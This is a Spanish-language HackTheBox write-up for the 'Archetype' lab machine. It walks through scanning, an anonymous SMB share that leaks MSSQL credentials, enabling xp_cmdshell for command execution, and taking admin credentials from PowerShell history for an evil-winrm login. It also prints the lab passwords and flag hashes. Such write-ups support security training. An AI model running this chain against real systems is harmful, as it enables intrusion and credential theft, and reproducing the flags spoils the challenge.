---
titulo: "Archetype"
descripcion: "Null session SMB para leak de credenciales MSSQL, xp_cmdshell para RCE, y escalada a Administrator vía PowerShell history."
fecha: 2026-06-09
dificultad: easy
herramientas: ["nmap", "smbclient", "mssqlclient.py", "evil-winrm"]
categoria: htb
plataforma: HackTheBox
completado: true
fases: ["Reconocimiento", "Foothold", "Escalada de Privilegios"]
---

## Reconocimiento

Fase 1 — descubrimiento de puertos:

```bash
nmap -vvv -p- --open -sS --min-rate 5000 -n -Pn 10.129.95.187
```

Fase 2 — detección de versiones y scripts sobre los puertos encontrados:

```bash
nmap -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.129.95.187 -sCV
```

Puertos relevantes: **445/tcp (SMB)**, **1433/tcp (MSSQL 2017)**, **5985/tcp (WinRM)**

## Foothold

Enumeración de shares SMB sin credenciales (null session):

```bash
smbclient -N -L //10.129.95.187
```

Output:
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

El share `backups` es el único no administrativo. Conexión y descarga de archivo:

```bash
smbclient -N //10.129.95.187/backups
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020
smb: \> get prod.dtsConfig
```

Lectura del archivo `.dtsConfig` — contiene cadena de conexión MSSQL con credenciales:

```xml
<ConfiguredValue>
Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;
</ConfiguredValue>
```

Credenciales obtenidas: `ARCHETYPE\sql_svc:M3g4c0rp123`

Conexión a MSSQL con autenticación de Windows:

```bash
mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187
```

Habilitación de `xp_cmdshell` para ejecución de comandos en el sistema:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Ejecución de comandos y captura de flag de usuario:

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
-- user.txt detectado

EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
-- 3e7b102e78218e935bf3f4951fec21a3
```

## Escalada de Privilegios

Enumeración del historial de PowerShell del usuario `sql_svc`:

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine';
-- ConsoleHost_history.txt detectado

EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

Output:
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dmn1!!
exit
```

Credenciales de Administrator expuestas en historial: `administrator:MEGACORP_4dmn1!!`

Conexión por WinRM con `evil-winrm` utilizando las credenciales descubiertas:

```bash
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dmn1!!'
```

Lectura de flag de root desde el Desktop del Administrator:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

## Flags

| Flag | Hash |
|------|------|
| User | `3e7b102e78218e935bf3f4951fec21a3` |
| Root | `b91ccec3305e98240082d4474b848528` |
